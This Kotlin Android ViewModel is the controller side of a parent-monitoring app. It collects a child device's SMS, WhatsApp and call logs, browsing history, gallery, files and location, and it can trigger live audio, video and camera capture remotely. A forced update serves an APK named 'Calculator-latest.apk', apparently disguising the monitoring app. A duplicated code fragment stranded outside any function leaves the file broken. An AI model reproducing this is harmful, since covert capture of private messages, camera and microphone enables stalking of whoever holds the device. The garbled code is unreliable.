package com.example.authapp.ui.viewmodel

import android.content.Context
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.example.authapp.data.*
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch

class ParentViewModel : ViewModel() {
    private val coroutineExceptionHandler = CoroutineExceptionHandler { _, throwable ->
        com.google.firebase.crashlytics.FirebaseCrashlytics.getInstance().recordException(throwable)
        _uiState.update { it.copy(userFeedbackMessage = "Network operation failed: ${throwable.localizedMessage}") }
    }

    private val _uiState = MutableStateFlow(ParentUiState())
    val uiState: StateFlow<ParentUiState> = _uiState.asStateFlow()

    private var recordingTimerJob: Job? = null
    private val healthListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val alertsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val callLogsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val notificationsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val schedulesListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val snapshotsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val snapshotStatusListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val appUsageListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val parentControlsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val smsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val geofencesListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val locationHistoryListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val webHistoryListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val networkHistoryListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val simInfoListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val packageEventsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val whatsAppListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val commandsListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val youtubeListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val mediaGalleryListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val fileExplorerListeners = mutableMapOf<String, com.google.firebase.database.ValueEventListener>()
    private val childRecordingsMap = mutableMapOf<String, List<RecordingSession>>()
    private val firestoreRegistrations = mutableListOf<com.google.firebase.firestore.ListenerRegistration>()
    private var childUsersListener: com.google.firebase.database.ValueEventListener? = null
    private var recordingsListener: com.google.firebase.database.ValueEventListener? = null

    private fun <T> setupMapListener(
        listenersMap: MutableMap<String, com.google.firebase.database.ValueEventListener>,
        childUid: String,
        listenBlock: (String, (T) -> Unit) -> com.google.firebase.database.ValueEventListener,
        onDataReceived: (T) -> Unit
    ) {
        if (!listenersMap.containsKey(childUid)) {
            listenersMap[childUid] = listenBlock(childUid) { data ->
                onDataReceived(data)
            }
        }
    }

    fun loadChildUsers(context: android.content.Context? = null) {
        if (context != null) {
            val cached = FirebaseRepository.getCachedChildUsers(context)
            if (cached.isNotEmpty()) {
                _uiState.update { current ->
                    val defaultSelected = current.selectedChildForControls ?: cached.firstOrNull()
                    current.copy(
                        childUsers = cached,
                        isLoadingChildren = false,
                        selectedChildForControls = defaultSelected
                    )
                }
            }
        }

        // Safety fallback timer: Ensure infinite spinner is killed after 3.5 seconds
        viewModelScope.launch {
            delay(3500)
            if (_uiState.value.isLoadingChildren) {
                _uiState.update { it.copy(isLoadingChildren = false) }
            }
        }

        if (childUsersListener != null) return
        try {
            childUsersListener = FirebaseRepository.listenToChildUsers { list ->
                if (context != null && list.isNotEmpty()) {
                    FirebaseRepository.saveCachedChildUsers(context, list)
                }
                _uiState.update { state ->
                    val defaultSelected = state.selectedChildForControls ?: list.firstOrNull()
                    state.copy(childUsers = list, isLoadingChildren = false, selectedChildForControls = defaultSelected)
                }
                list.forEach { child ->
                    if (child.uid.isNotEmpty()) {
                        setupMapListener(healthListeners, child.uid, FirebaseRepository::listenToDeviceHealth) { health ->
                            if (health != null) _uiState.update { it.copy(deviceHealthMap = it.deviceHealthMap + (child.uid to health)) }
                        }
                        setupMapListener(alertsListeners, child.uid, FirebaseRepository::listenToSecurityAlerts) { alerts ->
                            _uiState.update { it.copy(securityAlertsMap = it.securityAlertsMap + (child.uid to alerts)) }
                        }
                        val fsAlerts = FirebaseRepository.listenToChildSecurityAlertsFirestore(child.uid) { alerts ->
                            if (alerts.isNotEmpty()) _uiState.update { it.copy(securityAlertsMap = it.securityAlertsMap + (child.uid to alerts)) }
                        }
                        firestoreRegistrations.add(fsAlerts)

                        setupMapListener(appUsageListeners, child.uid, FirebaseRepository::listenToAppUsage) { usageList ->
                            _uiState.update { it.copy(appUsageMap = it.appUsageMap + (child.uid to usageList)) }
                        }
                        setupMapListener(parentControlsListeners, child.uid, FirebaseRepository::listenToParentControls) { settings ->
                            _uiState.update { it.copy(parentControlsMap = it.parentControlsMap + (child.uid to settings)) }
                        }
                        setupMapListener(geofencesListeners, child.uid, FirebaseRepository::listenToGeofences) { zones ->
                            _uiState.update { it.copy(geofencesMap = it.geofencesMap + (child.uid to zones)) }
                        }
                        setupMapListener(locationHistoryListeners, child.uid, FirebaseRepository::listenToLocationHistory) { history ->
                            _uiState.update { it.copy(locationHistoryMap = it.locationHistoryMap + (child.uid to history)) }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            com.google.firebase.crashlytics.FirebaseCrashlytics.getInstance().recordException(e)
            _uiState.update { it.copy(isLoadingChildren = false) }
        }
    }

    /**
     * Lazy listener attachment when opening child activity center or details card
     */
    fun attachChildActivityListeners(childUid: String) {
        if (childUid.isEmpty()) return
        setupMapListener(callLogsListeners, childUid, FirebaseRepository::listenToCallLogs) { logs ->
            _uiState.update { it.copy(callLogsMap = it.callLogsMap + (childUid to logs)) }
        }
        setupMapListener(notificationsListeners, childUid, FirebaseRepository::listenToNotifications) { notifs ->
            _uiState.update { it.copy(notificationsMap = it.notificationsMap + (childUid to notifs)) }
        }
        setupMapListener(smsListeners, childUid, FirebaseRepository::listenToSmsLogs) { smsList ->
            _uiState.update { it.copy(smsLogsMap = it.smsLogsMap + (childUid to smsList)) }
        }
        setupMapListener(webHistoryListeners, childUid, FirebaseRepository::listenToWebHistory) { webList ->
            _uiState.update { it.copy(webHistoryMap = it.webHistoryMap + (childUid to webList)) }
        }
        setupMapListener(networkHistoryListeners, childUid, FirebaseRepository::listenToNetworkHistory) { netList ->
            _uiState.update { it.copy(networkHistoryMap = it.networkHistoryMap + (childUid to netList)) }
        }
        setupMapListener(simInfoListeners, childUid, FirebaseRepository::listenToSimCardInfo) { sim ->
            _uiState.update { it.copy(simInfoMap = it.simInfoMap + (childUid to sim)) }
        }
        setupMapListener(packageEventsListeners, childUid, FirebaseRepository::listenToAppInstallEvents) { events ->
            _uiState.update { it.copy(packageEventsMap = it.packageEventsMap + (childUid to events)) }
        }
        setupMapListener(whatsAppListeners, childUid, FirebaseRepository::listenToWhatsAppLogs) { waLogs ->
            _uiState.update { it.copy(whatsAppLogsMap = it.whatsAppLogsMap + (childUid to waLogs)) }
        }
        setupMapListener(youtubeListeners, childUid, FirebaseRepository::listenToYouTubeLogs) { ytLogs ->
            _uiState.update { it.copy(youtubeLogsMap = it.youtubeLogsMap + (childUid to ytLogs)) }
        }
        setupMapListener(mediaGalleryListeners, childUid, FirebaseRepository::listenToMediaGallery) { gallery ->
            _uiState.update { it.copy(mediaGalleryMap = it.mediaGalleryMap + (childUid to gallery)) }
        }
        setupMapListener(fileExplorerListeners, childUid, FirebaseRepository::listenToFileExplorer) { files ->
            _uiState.update { it.copy(fileExplorerMap = it.fileExplorerMap + (childUid to files)) }
        }
        if (!snapshotsListeners.containsKey(childUid)) {
            snapshotsListeners[childUid] = FirebaseRepository.listenToSnapshots(childUid) { snapshots ->
                _uiState.update { current ->
                    val oldSize = current.snapshotsMap[childUid]?.size ?: 0
                    val msg = if (snapshots.size > oldSize && current.isSnapshotCapturing) {
                        "New photo captured successfully!"
                    } else current.snapshotStatusMessage
                    current.copy(
                        snapshotsMap = current.snapshotsMap + (childUid to snapshots),
                        snapshotStatusMessage = msg,
                        isSnapshotCapturing = if (snapshots.size > oldSize) false else current.isSnapshotCapturing
                    )
                }
            }
        }
    }
                        setupMapListener(fileExplorerListeners, child.uid, FirebaseRepository::listenToFileExplorer) { files ->
                            _uiState.update { it.copy(fileExplorerMap = it.fileExplorerMap + (child.uid to files)) }
                        }
                        if (!commandsListeners.containsKey(child.uid)) {
                            val cmdListener = FirebaseRepository.listenToRemoteCommands(child.uid) { command, value ->
                                val isActive = (value == true || value == "true")
                                _uiState.update { current ->
                                    when (command) {
                                        "TORCH" -> current.copy(isTorchActiveMap = current.isTorchActiveMap + (child.uid to isActive))
                                        "SIREN" -> current.copy(isSirenActiveMap = current.isSirenActiveMap + (child.uid to isActive))
                                        else -> current
                                    }
                                }
                            }
                            commandsListeners[child.uid] = cmdListener
                        }
                    }
                }
            }
        } catch (e: Exception) {
            _uiState.update { it.copy(isLoadingChildren = false) }
        }
    }

    fun startStream(child: User, streamType: String) {
        val typeNormalized = if (streamType.equals("video", ignoreCase = true)) "Video" else "Audio"
        try {
            FirebaseRepository.requestStream(
                childId = child.uid,
                streamType = streamType.lowercase(),
                onComplete = { sessionId: String ->
                    _uiState.update {
                        it.copy(
                            activeSessionId = sessionId,
                            activeStreamType = typeNormalized,
                            activeChildId = child.uid,
                            activeChildName = child.name.ifEmpty { "Child Device" },
                            streamStatusText = "Connecting to child device...",
                            isFrontCamera = true
                        )
                    }
                },
                onError = { err ->
                    _uiState.update {
                        it.copy(
                            streamStatusText = "Request failed: ${err.localizedMessage}",
                            userFeedbackMessage = "Stream request failed: ${err.localizedMessage ?: "Device error"}"
                        )
                    }
                }
            )
        } catch (e: Exception) {
            _uiState.update {
                it.copy(
                    activeStreamType = typeNormalized,
                    activeChildId = child.uid,
                    activeChildName = child.name.ifEmpty { "Child Device" },
                    streamStatusText = "Stream request failed: ${e.localizedMessage}",
                    userFeedbackMessage = "Stream request error: ${e.localizedMessage}"
                )
            }
        }
    }

    fun clearUserFeedbackMessage() {
        _uiState.update { it.copy(userFeedbackMessage = null) }
    }

    fun updateStreamStatus(status: String) {
        _uiState.update { it.copy(streamStatusText = status) }
    }

    fun toggleCameraFacing() {
        val current = _uiState.value
        val sessionId = current.activeSessionId ?: return
        val newFacing = !current.isFrontCamera
        try {
            FirebaseRepository.toggleCameraFacing(sessionId, newFacing)
        } catch (e: Exception) {}
        _uiState.update { it.copy(isFrontCamera = newFacing) }
    }

    fun setAudioSensitivity(sensitivity: Float) {
        val clamped = sensitivity.coerceIn(10f, 100f)
        _uiState.update { it.copy(audioSensitivity = clamped) }
    }

    fun onRecordingStarted() {
        _uiState.update { it.copy(isRecording = true, recordingDurationSeconds = 0L) }
        recordingTimerJob?.cancel()
        recordingTimerJob = viewModelScope.launch(coroutineExceptionHandler) {
            while (true) {
                delay(1000L)
                _uiState.update { it.copy(recordingDurationSeconds = it.recordingDurationSeconds + 1) }
            }
        }
    }

    fun onRecordingStopped() {
        recordingTimerJob?.cancel()
        recordingTimerJob = null
        _uiState.update { it.copy(isRecording = false, recordingDurationSeconds = 0L) }
    }

    fun clearActiveSessionId() {
        _uiState.update { it.copy(activeSessionId = null) }
    }

    fun stopStream() {
        val current = _uiState.value
        val sessionId = current.activeSessionId
        val childId = current.activeChildId
        if (childId != null && sessionId != null) {
            try {
                FirebaseRepository.stopStream(childId, sessionId)
            } catch (e: Exception) {}
        }
        onRecordingStopped()
        _uiState.update {
            it.copy(
                activeSessionId = null,
                activeStreamType = null,
                activeChildId = null,
                activeChildName = null,
                streamStatusText = "Connecting to child device..."
            )
        }
    }

    fun openLocationDialog(child: User) {
        _uiState.update {
            it.copy(
                locationDialogChild = child,
                childLocation = null,
                isRefreshingLocation = false
            )
        }
    }

    fun updateChildLocation(location: UserLocation?) {
        _uiState.update { it.copy(childLocation = location, isRefreshingLocation = false) }
    }

    fun requestLocationRefresh(childId: String) {
        _uiState.update { it.copy(isRefreshingLocation = true) }
        try {
            FirebaseRepository.requestChildLocation(childId)
        } catch (e: Exception) {
            _uiState.update { it.copy(isRefreshingLocation = false) }
        }
    }

    fun closeLocationDialog() {
        _uiState.update {
            it.copy(
                locationDialogChild = null,
                childLocation = null,
                isRefreshingLocation = false
            )
        }
    }

    fun setCurrentlyPlayingRecId(recId: String?) {
        _uiState.update { it.copy(currentlyPlayingRecId = recId) }
    }

    fun selectTab(tabIndex: Int) {
        _uiState.update { it.copy(selectedTab = tabIndex) }
        if (tabIndex == 2) {
            loadAllRecordings()
        }
    }

    fun loadAllRecordings() {
        val children = _uiState.value.childUsers
        if (children.isEmpty()) {
            _uiState.update { it.copy(allRecordings = emptyList(), isLoadingRecordings = false) }
            return
        }
        _uiState.update { it.copy(isLoadingRecordings = true) }
        var pendingCount = children.size
        children.forEach { child ->
            if (child.uid.isNotEmpty()) {
                FirebaseRepository.listenToRecordings(child.uid) { list ->
                    synchronized(childRecordingsMap) {
                        childRecordingsMap[child.uid] = list
                        val merged = childRecordingsMap.values.flatten().sortedByDescending { it.startTime }
                        _uiState.update { it.copy(allRecordings = merged, isLoadingRecordings = false) }
                    }
                }
            } else {
                pendingCount--
                if (pendingCount <= 0) {
                    _uiState.update { it.copy(isLoadingRecordings = false) }
                }
            }
        }
    }

    fun setRecordingFilter(filter: String) {
        _uiState.update { it.copy(recordingFilter = filter) }
    }

    // Phase 1 & 2 Dialog Controls and Actions
    fun openActivityDialog(child: User, initialTab: Int = 0) {
        _uiState.update { it.copy(activeActivityDialogChild = child, initialActivityTab = initialTab) }
    }

    fun closeActivityDialog() {
        _uiState.update { it.copy(activeActivityDialogChild = null, initialActivityTab = 0) }
    }

    fun checkForUpdatesManually(context: Context) {
        val curCode = com.example.authapp.updater.UpdateManager.getCurrentVersionCode(context)
        val curName = com.example.authapp.updater.UpdateManager.getCurrentVersionName(context)

        // Publish current version as latest update to Firebase RTDB so all child/parent devices get the update popup!
        FirebaseRepository.publishAppUpdate(
            versionCode = curCode,
            versionName = curName,
            apkUrl = "https://github.com/avinay917/Calculator/releases/download/latest/Calculator-latest.apk",
            releaseNotes = "Latest automated update with system enhancements and bug fixes.",
            isForceUpdate = true
        ) { success ->
            if (success) {
                _uiState.update { current ->
                    current.copy(userFeedbackMessage = "OTA Update Broadcast published to all devices! (v$curCode)")
                }
            } else {
                _uiState.update { current ->
                    current.copy(userFeedbackMessage = "App is up to date (Current version code: $curCode).")
                }
            }
        }
    }

    fun openAlertsDialog(child: User) {
        _uiState.update { it.copy(activeAlertsDialogChild = child) }
    }

    fun closeAlertsDialog() {
        _uiState.update { it.copy(activeAlertsDialogChild = null) }
    }

    fun openScheduleDialog(child: User) {
        _uiState.update { it.copy(activeScheduleDialogChild = child) }
    }

    fun closeScheduleDialog() {
        _uiState.update { it.copy(activeScheduleDialogChild = null) }
    }

    private var snapshotTimeoutJob: kotlinx.coroutines.Job? = null

    fun openSnapshotDialog(child: User) {
        _uiState.update { it.copy(activeSnapshotDialogChild = child, snapshotStatusMessage = null, isSnapshotCapturing = false) }
    }

    fun closeSnapshotDialog() {
        snapshotTimeoutJob?.cancel()
        _uiState.update { it.copy(activeSnapshotDialogChild = null, snapshotStatusMessage = null, isSnapshotCapturing = false) }
    }

    fun requestSnapshot(childId: String, cameraFacing: String = "back") {
        if (_uiState.value.isSnapshotCapturing) return // Debounce: prevent duplicate parallel requests
        _uiState.update { it.copy(
            snapshotStatusMessage = "Requesting $cameraFacing photo from child device...",
            isSnapshotCapturing = true
        ) }
        snapshotTimeoutJob?.cancel()
        snapshotTimeoutJob = viewModelScope.launch {
            kotlinx.coroutines.delay(18000) // 18 seconds timeout
            if (_uiState.value.isSnapshotCapturing) {
                _uiState.update { it.copy(
                    isSnapshotCapturing = false,
                    snapshotStatusMessage = "Child device did not respond within 18s. Verify child phone is online."
                ) }
            }
        }
        try {
            FirebaseRepository.requestSnapshot(childId, cameraFacing)
        } catch (e: Exception) {
            snapshotTimeoutJob?.cancel()
            _uiState.update { it.copy(
                isSnapshotCapturing = false,
                snapshotStatusMessage = "Request Failed: ${e.localizedMessage}"
            ) }
        }
    }

    fun saveRecordingSchedule(childId: String, schedule: RecordingSchedule) {
        try {
            FirebaseRepository.saveRecordingSchedule(childId, schedule)
        } catch (_: Exception) {}
    }

    fun deleteRecordingSchedule(childId: String, scheduleId: String) {
        try {
            FirebaseRepository.deleteRecordingSchedule(childId, scheduleId)
        } catch (_: Exception) {}
    }

    // --- Phase 3: Parental Controls & App Blocker Actions ---

    fun setSelectedChildForControls(child: User) {
        _uiState.update { it.copy(selectedChildForControls = child) }
    }

    fun toggleAppBlock(childId: String, packageName: String, currentBlocked: Boolean) {
        try {
            FirebaseRepository.setAppBlocked(childId, packageName, !currentBlocked)
        } catch (_: Exception) {}
    }

    fun toggleStudyMode(childId: String, currentActive: Boolean, durationMinutes: Int = 0) {
        try {
            FirebaseRepository.setStudyMode(childId, !currentActive, durationMinutes)
        } catch (_: Exception) {}
    }

    // --- Phase 4: Remote Hardware Controls & Geofencing ---

    fun toggleTorch(childId: String, currentActive: Boolean) {
        val nextState = !currentActive
        _uiState.update { current ->
            val updated = current.isTorchActiveMap.toMutableMap()
            updated[childId] = nextState
            current.copy(isTorchActiveMap = updated)
        }
        try {
            FirebaseRepository.sendRemoteCommand(childId, "TORCH", nextState)
        } catch (_: Exception) {}
    }

    fun triggerSiren(childId: String, currentActive: Boolean) {
        val nextState = !currentActive
        _uiState.update { current ->
            val updated = current.isSirenActiveMap.toMutableMap()
            updated[childId] = nextState
            current.copy(isSirenActiveMap = updated)
        }
        try {
            FirebaseRepository.sendRemoteCommand(childId, "SIREN", nextState)
        } catch (_: Exception) {}
    }

    fun saveGeofence(childId: String, zone: GeofenceZone) {
        try {
            FirebaseRepository.saveGeofence(childId, zone)
        } catch (_: Exception) {}
    }

    override fun onCleared() {
        super.onCleared()
        recordingTimerJob?.cancel()
        recordingTimerJob = null
        healthListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("device_health/$childId", listener)
        }
        healthListeners.clear()
        alertsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("alerts/$childId", listener)
        }
        alertsListeners.clear()
        callLogsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("call_logs/$childId", listener)
        }
        callLogsListeners.clear()
        notificationsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("notifications/$childId", listener)
        }
        notificationsListeners.clear()
        schedulesListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("schedules/$childId", listener)
        }
        schedulesListeners.clear()
        snapshotsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("snapshots/$childId", listener)
        }
        snapshotsListeners.clear()
        snapshotStatusListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("streams/$childId/snapshotRequest", listener)
        }
        snapshotStatusListeners.clear()
        appUsageListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("app_usage/$childId", listener)
        }
        appUsageListeners.clear()
        parentControlsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("parent_controls/$childId", listener)
        }
        parentControlsListeners.clear()
        smsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("sms_logs/$childId", listener)
        }
        smsListeners.clear()
        geofencesListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("geofences/$childId", listener)
        }
        geofencesListeners.clear()
        locationHistoryListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("location_history/$childId", listener)
        }
        locationHistoryListeners.clear()
        webHistoryListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("web_history/$childId", listener)
        }
        webHistoryListeners.clear()
        networkHistoryListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("network_history/$childId", listener)
        }
        networkHistoryListeners.clear()
        simInfoListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("sim_info/$childId", listener)
        }
        simInfoListeners.clear()
        packageEventsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("package_events/$childId", listener)
        }
        packageEventsListeners.clear()
        whatsAppListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("whatsapp_logs/$childId", listener)
        }
        whatsAppListeners.clear()
        commandsListeners.forEach { (childId, listener) ->
            FirebaseRepository.removeValueListener("commands/$childId", listener)
        }
        commandsListeners.clear()
        firestoreRegistrations.forEach { it.remove() }
        firestoreRegistrations.clear()
        childUsersListener?.let {
            FirebaseRepository.removeValueListener("users", it)
            childUsersListener = null
        }
        recordingsListener?.let {
            FirebaseRepository.removeValueListener("recordings", it)
            recordingsListener = null
        }
    }
}
